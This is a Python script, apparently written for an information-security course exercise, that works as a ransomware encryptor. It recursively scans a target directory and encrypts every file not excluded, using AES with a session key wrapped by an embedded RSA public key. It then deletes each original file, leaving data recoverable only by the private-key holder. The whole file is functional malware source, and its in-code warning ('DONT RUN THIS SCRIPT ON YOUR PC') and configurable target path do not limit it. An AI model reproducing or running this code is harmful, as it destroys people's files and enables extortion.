import base64
import os
import gc
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# public key with base64 encoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE0RnM2NlMvMVpZU3FGdklJK0tKcQp3b21GV1RLcUZXcXk5ajVrQUNWaEtlRHY3dlFPRjlBSWdLcmVXOWJUNHdHamczanI3TXllV1hYc3psTjkrRVc5ClZOWnR6R3BqTnV5RHFvMjZkWEZHb2o5bXZuZDhBeUttaTRseTBXbGx1MHMrYTlqVzZ2TmdBN0xWWnZWSElxU2cKNDl4cVIyanU0dUpJS1RFT0lQNHBWajJZdHBHN0xVTXhsUXhjYjc1b0V5QUJDMjg0emhwanBTUlloNndwckZRawpjMkF4c2FKS2F4UWpEbk0yaTFlc1BRMXAvdmdZbHN0cnBmd1ZVWnBZSnRtTHh2emg4bHhGZDd4Zk5PV0RNdy9SCnpKWWNKY2Q2UXJjaFhZMGcveUY5WkZ6QSs4UDZTbE5PcXlLZW5US0llZVA3ZC91bkJITVNpQndVQ0VyYW5yTmcKWVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)


def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey, extension):
    '''
    Input: path to file to encrypt, public key
    Output: encrypted file with extension .L0v3sh3 and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    del sessionKey
    gc.collect()
    # save the encrypted data to file
    fileName= dataFile.split(extension)[0]
    with open(fileName, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)
    if extension:
        os.rename(fileName, fileName+extension)


# change directory to the directory of the script
# keep secure of changing the directory,
# DONT RUN THIS SCRIPT ON YOUR PC
directory = '/home/marcelo/Documents/infosec/ex2/TestRamsware' # CHANGE THIS
excludeExtension = ['.pem', '.exe'] # CHANGE THIS

for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = ""
    fileType = filePath.suffix.lower()
    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubKey, fileType)

